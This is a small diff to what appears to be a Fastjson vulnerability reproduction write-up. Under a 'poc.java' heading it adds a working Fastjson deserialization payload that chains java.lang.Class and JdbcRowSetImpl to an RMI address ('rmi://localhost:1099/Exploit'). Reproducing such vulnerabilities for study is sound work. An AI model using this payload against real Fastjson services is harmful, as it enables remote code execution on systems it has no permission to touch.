@@ -16,6 +16,9 @@ https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe
 ![](./Fastjson.jpg)
 
 ## poc.java
+
+`{ "name ":{ "@type ": "java.lang.Class ", "val ": "com.sun.rowset.JdbcRowSetImpl "}," +" "xxxx ":{ "@type ": "com.sun.rowset.JdbcRowSetImpl ", "dataSourceName ":" +" "rmi://localhost:1099/Exploit ", "autoCommit ":true}}}`
+
 ```
 import com.alibaba.fastjson.JSON;
 
